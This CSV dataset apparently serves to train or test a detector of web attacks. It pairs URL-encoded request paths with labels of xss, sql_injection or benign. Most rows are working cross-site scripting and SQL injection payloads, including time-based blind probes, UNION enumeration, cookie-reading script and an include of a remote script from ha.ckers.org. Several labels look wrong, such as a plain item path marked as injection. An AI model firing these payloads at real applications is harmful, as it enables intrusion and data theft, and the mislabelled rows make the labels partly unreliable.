text,label
/v1/search?q=%3Csvg%3E%3Cpath%3E%3CanimateMotion+onend%3Dalert%281%29+dur%3D1s+repeatCount%3D1%3E,xss
/api/v2/profile?id=%3Cmenu+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmenu%3E,xss
/api/v1/login?username=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%23&password=pass,sql_injection
/api/v2/comments/%3Cform+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fform%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ccite+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fcite%3E,xss
/api/v1/login?username=ORDER+BY+19%23&password=pass,sql_injection
/api/v1/reviews?body=%3Ctime+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Ftime%3E,xss
/api/v1/users?id=%27+and+1+in+%28select+var+from+temp%29--,sql_injection
/v1/orders?customer_id=%27%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&status=active,sql_injection
/api/v1/feedback?message=%3Caside+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Faside%3E,xss
/api/v2/items/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%23?key=API_KEY,sql_injection
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Crp+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Frp%3E,xss
/v1/profile?bio=%3Csvg%3E%3Coption+onload%3Dalert%281%29%3E%3C%2Foption%3E,xss
/api/v1/reviews?body=%3Ccontent+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fcontent%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cli+onclick%3D%22alert%281%29%22%3Etest%3C%2Fli%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cbasefont+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fbasefont%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Csvg+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fsvg%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cfigcaption+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Ffigcaption%3E,xss
/api/v2/profile?id=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E,xss
/api/v1/search?q=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29,sql_injection
/v1/search?q=%3Ciframe+src%3D%2522404%2522+onload%3D%2522self.frames%5B0%5D.document.write%28%2526quot%3B%3Cscript%3Er%3Dnew+XMLHttpRequest%28%29%3Br.open%28%27GET%27%2C%27http%3A%2F%2Fxssme.html5sec.org%2Fxssme2%27%2Cfalse%29%3Br.send%28null%29%3Bif%28r.status%3D%3D200%29%7Balert%28r.responseText.substr%28150%2C41%29%29%3B%7D%3C%5C%2Fscript%3E%2526quot%3B%29%2522%3E%3C%2Fiframe%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Col+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fol%3E,xss
/api/v2/comments/%3Ctime+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftime%3E,xss
/api/v2/comments/%3Caudio+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Faudio%3E,xss
/api/v1/reviews?body=%3C%21+%27%3D%22foo%22%3E%3Cx+foo%3D%27%3E%3Cimg+src%3Dx+onerror%3Dalert%282%29%2F%2F%27%3E,xss
/v1/profile?bio=%3Cvideo+id%3Dx+controls+onfocus%3Dalert%281%29%3E%3Csource+src%3D%22validvideo.mp4%22+type%3Dvideo%2Fmp4%3E%3C%2Fvideo%3E,xss
/api/v2/profile?id=%3Cmain+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fmain%3E,xss
/v1/profile?bio=%3Cstrike+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fstrike%3E,xss
/api/v1/comments?text=%3Ccanvas+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fcanvas%3E,xss
/v1/profile?bio=%3Clisting+onclick%3D%22alert%281%29%22%3Etest%3C%2Flisting%3E,xss
/v1/profile?bio=%3Cbutton+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fbutton%3E,xss
/api/v2/profile?id=%3Cfont+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Ffont%3E,xss
/api/v1/feedback?message=%3Ckbd+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fkbd%3E,xss
/api/v1/feedback?message=%3CD3%2FOnMouSEenTer%3D%5B2%5D.find%28confirm%29%3Ez,xss
/api/v1/reviews?body=%3Cform+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fform%3E,xss
/api/v1/feedback?message=%3Ccode+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fcode%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ctr+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Ftr%3E,xss
/v1/profile?bio=%3Csource+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsource%3E,xss
/api/v1/feedback?message=%3Chtml+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fhtml%3E,xss
/v1/profile?bio=%3Cmulticol+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fmulticol%3E,xss
/api/v1/login?username=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%29%29%23&password=pass,sql_injection
/api/v1/users?id=%27%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A,sql_injection
/api/v1/reviews?body=%3Ctr+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftr%3E,xss
/api/v1/comments?text=%3Clegend+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Flegend%3E,xss
/api/v2/comments/%3Ctime+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Ftime%3E,xss
/api/v2/profile?id=%3Cbig+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fbig%3E,xss
/api/v1/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%23,sql_injection
/v1/profile?bio=%3Cblink+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fblink%3E,xss
/api/v1/feedback?message=%3Cwbr+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fwbr%3E,xss
/api/v2/profile?id=%3Ctfoot+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Ftfoot%3E,xss
/v1/orders?customer_id=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9--&status=active,sql_injection
/api/v2/comments/%3Csvg%3E%3Cruby+onload%3Dalert%281%29%3E%3C%2Fruby%3E,xss
/api/v2/comments/%3Ciframe+id%3Dx+onfocus%3Dalert%281%29%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cvar+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fvar%3E,xss
/v1/search?q=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cslot+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fslot%3E,xss
/v1/search?q=%3Cspan+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fspan%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cobject+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fobject%3E,xss
/v1/profile?bio=%3Cmath%3E%3Cbrute+href%3Djavascript%3Aalert%281%29%3Eclick,xss
/api/v1/login?username=1234+%22+AND+1%3D0+UNION+ALL+SELECT+%22admin%22%2C+%2281dc9bdb52d04dc20036dbd8313ed055&password=pass,sql_injection
/v1/profile?bio=%3Cfigure+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Ffigure%3E,xss
/api/v1/comments?text=%3Cparam+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fparam%3E,xss
/api/v2/profile?id=%3Cbody+onhashchange%3Dalert%281%29%3E%3Ca+href%3D%23x%3Eclick+this%21%23x,xss
/api/v1/users?id=ORDER+BY+SLEEP%285%29,sql_injection
/api/v1/reviews?body=%3Cstrike+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fstrike%3E,xss
/api/v1/search?q=or+a%3Da--,sql_injection
/v1/profile?bio=%3Cu+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fu%3E,xss
/api/v2/comments/%3Cruby+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fruby%3E,xss
/api/v2/comments/%3Cnoscript+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fnoscript%3E,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cbig+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fbig%3E,xss
/api/v2/search?q=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26&key=API_KEY,sql_injection
/api/v1/login?username=delete&password=pass,sql_injection
/api/v1/comments?text=%3Cmenu+id%3Dx+contextmenu%3Dx+onshow%3Dalert%281%29%3Eright+click+me%21,xss
/v1/profile?bio=%3Cform+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fform%3E,xss
/v1/search?q=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ctd+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Ftd%3E,xss
/api/v1/feedback?message=%3Ccite+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fcite%3E,xss
/v1/search?q=%3Cembed+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fembed%3E,xss
/api/v2/comments/%3Ckbd+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fkbd%3E,xss
/api/v1/reviews?body=%3Cstrike+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fstrike%3E,xss
/api/v2/search?q=%27+select+name+from+syscolumns+where+id+%3D+%28select+id+from+sysobjects+where+name+%3D+tablename%27%29--&key=API_KEY,sql_injection
/v1/search?q=%3Cbdo+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbdo%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cmain+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fmain%3E,xss
/api/v1/search?q=%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2F%2A,sql_injection
/api/v1/search?q=%27%3B+if+is_srvrolemember%28%27sysadmin%27%29+%3E+0+waitfor+delay+%270%3A0%3A2%27+--,sql_injection
/api/v2/profile?id=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cmarquee+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fmarquee%3E,xss
/api/v1/feedback?message=%3Cdetails+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fdetails%3E,xss
/api/v2/comments/%3Cbutton+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbutton%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cnobr+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fnobr%3E,xss
/v1/search?q=%3Cdir+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,xss
/api/v2/comments/%3Cbase+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbase%3E,xss
/v1/orders?customer_id=%27+group+by+username+having+1%3D1--&status=active,sql_injection
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cnoembed+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fnoembed%3E,xss
/api/v1/feedback?message=%3Cmain+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmain%3E,xss
/api/v1/feedback?message=%3Cx+contenteditable+onpaste%3Dalert%281%29%3Epaste+here%21,xss
/api/v1/feedback?message=%3Csource+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fsource%3E,xss
/api/v2/comments/%3Cmenuitem+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fmenuitem%3E,xss
/api/v2/comments/%3Ccode+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fcode%3E,xss
/api/v2/profile?id=%3Cfigure+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Ffigure%3E,xss
/api/v1/comments?text=%3Cxmp+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fxmp%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ctt+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Ftt%3E,xss
/api/v1/comments?text=%3Ch1+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fh1%3E,xss
/v1/search?q=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cdd+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fdd%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Coptgroup+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Foptgroup%3E,xss
/api/v1/users/66493,benign
/v1/profile?bio=%3Cnoembed+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fnoembed%3E,xss
/v1/orders?customer_id=%2521&status=active,sql_injection
/api/v1/feedback?message=%3Cxmp+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fxmp%3E,xss
/api/v1/search?q=%29%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--,sql_injection
/api/v2/comments/%3Cimg+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fimg%3E,xss
/api/v1/users?id=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%23,sql_injection
/api/v1/feedback?message=%3Csvg%3E%3Ccol+onload%3Dalert%281%29%3E%3C%2Fcol%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Capplet+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fapplet%3E,xss
/api/v1/feedback?message=%3Cdl+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdl%3E,xss
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Csource+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fsource%3E,xss
/api/v1/comments?text=%3Cdd+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fdd%3E,xss
/v1/profile?bio=%3Cbutton+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbutton%3E,xss
/api/v1/reviews?body=%3Ca+target%3D%22x%22+href%3D%22xssme%3Fxss%3D%3Cscript%3Efind%28%27cookie%27%29%3B+var+doc+%3D+getSelection%28%29.getRangeAt%280%29.startContainer.ownerDocument%3B+console.log%28doc%29%3B+var+xpe+%3D+new+XPathEvaluator%28%29%3B+var+nsResolver+%3D+xpe.createNSResolver%28doc%29%3B+var+result+%3D+xpe.evaluate%28%27%2F%2Fscript%2Ftext%28%29%27%2C+doc%2C+nsResolver%2C+0%2C+null%29%3B+alert%28result.iterateNext%28%29.data.match%28%2Fcookie+%3D+%27%28.%2A%3F%29%27%2F%29%5B1%5D%29%3C%2Fscript%3E,xss
/v1/search?q=%3Cq+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fq%3E,xss
/v1/search?q=%3Cthead+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fthead%3E,xss
/api/v1/reviews?body=%3Cmenu+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fmenu%3E,xss
/api/v2/profile?id=%3Cbgsound+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbgsound%3E,xss
/api/v2/search?q=admin%27%29+or+%28%271%27%3D%271%27%23&key=API_KEY,sql_injection
/api/v1/profile?id=100555,benign
/api/v1/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30--,sql_injection
/v1/profile?bio=%3Cbdo+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fbdo%3E,xss
/api/v1/search?q=%22%29+or+%28%22a%22%3D%22a,sql_injection
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cbdo+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fbdo%3E,xss
/api/v1/feedback?message=%3Ccenter+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fcenter%3E,xss
/api/v1/users?id=exec+xp,sql_injection
/api/v2/comments/%3Cruby+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fruby%3E,xss
/api/v1/feedback?message=%3Csub+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fsub%3E,xss
/v1/profile?bio=%3Cbody+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbody%3E,xss
/v1/search?q=%3Cpre+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpre%3E,xss
/api/v2/profile?id=%3Cthead+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fthead%3E,xss
/api/v1/search?q=%27%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--,sql_injection
/api/v1/comments?text=%3Cbasefont+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fbasefont%3E%3Cinput+autofocus%3E,xss
/api/v2/items/1?key=API_KEY,sql_injection
/api/v1/feedback?message=%3Ctfoot+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Ftfoot%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/users?id=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%29%29--,sql_injection
/v1/profile?bio=%3Csection+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsection%3E,xss
/api/v2/profile?id=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E,xss
/api/v1/feedback?message=%3Ccaption+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fcaption%3E,xss
/api/v2/comments/%3Cisindex+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fisindex%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Ccol+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcol%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ccolgroup+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fcolgroup%3E,xss
/v1/search?q=%3Ci+onclick%3D%22alert%281%29%22%3Etest%3C%2Fi%3E,xss
/api/v1/reviews?body=%3Ccommand+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcommand%3E,xss
/v1/search?q=%3Ctt+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Ftt%3E,xss
/api/v1/comments?text=%3Chgroup+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fhgroup%3E,xss
/v1/profile?bio=%3Cbr%3E,xss
/v1/search?q=%3Col+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fol%3E,xss
/api/v2/comments/%3Chgroup+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fhgroup%3E,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cmain+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fmain%3E,xss
/v1/search?q=%3Csamp+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsamp%3E,xss
/api/v1/users?id=delete,sql_injection
/api/v1/reviews?body=%3Cmain+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fmain%3E,xss
/api/v2/comments/%3Cbasefont+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fbasefont%3E,xss
/api/v2/items/0x730065006c0065006300740020004000400076006500+...?key=API_KEY,sql_injection
/api/v2/items/%29%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--?key=API_KEY,sql_injection
/v1/search?q=194241,benign
/api/v2/comments/%3Cmenuitem+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fmenuitem%3E,xss
/api/v2/comments/%3Cshadow+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fshadow%3E,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Chead+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fhead%3E,xss
/api/v1/users?id=hi+or+1%3D1+--%22,sql_injection
/api/v2/comments/%3Caudio+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Faudio%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3C%2Ftemplate%3E,xss
/api/v2/comments/%3Cspacer+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fspacer%3E,xss
/v1/products/ORDER+BY+17--,sql_injection
/api/v1/comments?text=%3Cframe+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fframe%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cfooter+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Ffooter%3E,xss
/v1/search?q=%3Cul+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Ful%3E,xss
/api/v2/comments/%3Cfooter+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Ffooter%3E,xss
/api/v2/profile?id=%3Cq+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fq%3E,xss
/api/v1/feedback?message=%3Csvg+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsvg%3E,xss
/api/v1/feedback?message=%3Cfigcaption+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Ffigcaption%3E,xss
